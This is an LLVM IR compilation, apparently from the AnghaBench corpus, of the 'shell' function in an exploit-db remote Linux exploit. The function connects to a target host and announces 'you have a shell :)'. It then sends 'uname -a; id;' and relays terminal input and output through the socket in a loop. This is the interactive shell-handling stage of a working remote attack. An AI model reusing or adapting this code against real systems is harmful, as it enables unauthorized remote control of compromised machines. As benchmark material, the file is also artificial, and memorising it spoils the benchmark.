; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_784.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_784.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"uname -a; id;\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c" gethostbyname()\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@ERROR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c" socket()\00", align 1
@TIMEOUT = common dso_local global i32 0, align 4
@b = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [3 x i8] c"\0D\0D\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c" done!\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c" [!] failed!\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c" done!\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [29 x i8] c"\0A\0A [!] you have a shell :)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %13 = load i32, i32* @BUFFERSIZE, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %7, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %8, align 8
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %17 = load i8*, i8** %3, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %11, align 8
  %19 = icmp eq %struct.hostent* %18, null
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  %21 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 @exit(i32 1) #5
  unreachable

24:                                               ; preds = %2
  %25 = load i32, i32* @AF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = call i32 @socket(i32 %25, i32 %26, i32 0)
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* @ERROR, align 4
  %29 = icmp eq i32 %27, %28
  br i1 %29, label %30, label %34

30:                                               ; preds = %24
  %31 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @exit(i32 1) #5
  unreachable

34:                                               ; preds = %24
  %35 = load i32, i32* @AF_INET, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 3
  store i32 %35, i32* %36, align 4
  %37 = load i32, i32* %4, align 4
  %38 = call i32 @htons(i32 %37)
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %38, i32* %39, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %41 = load %struct.hostent*, %struct.hostent** %11, align 8
  %42 = getelementptr inbounds %struct.hostent, %struct.hostent* %41, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = inttoptr i64 %43 to %struct.in_addr*
  %45 = bitcast %struct.in_addr* %40 to i8*
  %46 = bitcast %struct.in_addr* %44 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %45, i8* align 4 %46, i64 4, i1 false)
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %48 = call i32 @bzero(i32* %47, i32 8)
  %49 = load i32, i32* %5, align 4
  %50 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %51 = load i32, i32* @TIMEOUT, align 4
  %52 = call i32 @connect_timeout(i32 %49, %struct.sockaddr* %50, i32 4, i32 %51)
  %53 = load i32, i32* @ERROR, align 4
  %54 = icmp eq i32 %52, %53
  br i1 %54, label %55, label %65

55:                                               ; preds = %34
  %56 = load i64, i64* @b, align 8
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %61

58:                                               ; preds = %55
  %59 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %60 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %60)
  ret void

61:                                               ; preds = %55
  %62 = call i32 @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %63 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %64 = call i32 @exit(i32 1) #5
  unreachable

65:                                               ; preds = %34
  %66 = load i64, i64* @b, align 8
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %72, label %68

68:                                               ; preds = %65
  %69 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %70 = load i32, i32* @stdout, align 4
  %71 = call i32 @fflush(i32 %70)
  br label %72

72:                                               ; preds = %68, %65
  %73 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %74 = load i32, i32* @stdout, align 4
  %75 = call i32 @fflush(i32 %74)
  %76 = load i32, i32* %5, align 4
  %77 = load i8*, i8** %9, align 8
  %78 = load i8*, i8** %9, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = call i32 @send(i32 %76, i8* %77, i32 %79, i32 0)
  br label %81

81:                                               ; preds = %125, %72
  br label %82

82:                                               ; preds = %81
  %83 = call i32 @FD_ZERO(i32* %10)
  %84 = call i32 @FD_SET(i32 0, i32* %10)
  %85 = load i32, i32* %5, align 4
  %86 = call i32 @FD_SET(i32 %85, i32* %10)
  %87 = load i32, i32* %5, align 4
  %88 = add nsw i32 %87, 1
  %89 = call i32 @select(i32 %88, i32* %10, i32* null, i32* null, i32* null)
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %91, label %93

91:                                               ; preds = %82
  %92 = call i32 @exit(i32 0) #5
  unreachable

93:                                               ; preds = %82
  %94 = call i64 @FD_ISSET(i32 0, i32* %10)
  %95 = icmp ne i64 %94, 0
  br i1 %95, label %96, label %111

96:                                               ; preds = %93
  %97 = trunc i64 %14 to i32
  %98 = call i32 @read(i32 0, i8* %16, i32 %97)
  store i32 %98, i32* %6, align 4
  %99 = icmp slt i32 %98, 1
  br i1 %99, label %100, label %102

100:                                              ; preds = %96
  %101 = call i32 @exit(i32 0) #5
  unreachable

102:                                              ; preds = %96
  %103 = load i32, i32* %5, align 4
  %104 = load i32, i32* %6, align 4
  %105 = call i32 @send(i32 %103, i8* %16, i32 %104, i32 0)
  %106 = load i32, i32* %6, align 4
  %107 = icmp ne i32 %105, %106
  br i1 %107, label %108, label %110

108:                                              ; preds = %102
  %109 = call i32 @exit(i32 0) #5
  unreachable

110:                                              ; preds = %102
  br label %111

111:                                              ; preds = %110, %93
  %112 = load i32, i32* %5, align 4
  %113 = call i64 @FD_ISSET(i32 %112, i32* %10)
  %114 = icmp ne i64 %113, 0
  br i1 %114, label %115, label %125

115:                                              ; preds = %111
  %116 = load i32, i32* %5, align 4
  %117 = trunc i64 %14 to i32
  %118 = call i32 @recv(i32 %116, i8* %16, i32 %117, i32 0)
  store i32 %118, i32* %6, align 4
  %119 = icmp slt i32 %118, 1
  br i1 %119, label %120, label %122

120:                                              ; preds = %115
  %121 = call i32 @exit(i32 0) #5
  unreachable

122:                                              ; preds = %115
  %123 = load i32, i32* %6, align 4
  %124 = call i32 @write(i32 1, i8* %16, i32 %123)
  br label %125

125:                                              ; preds = %122, %111
  br label %81
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @bzero(i32*, i32) #2

declare dso_local i32 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
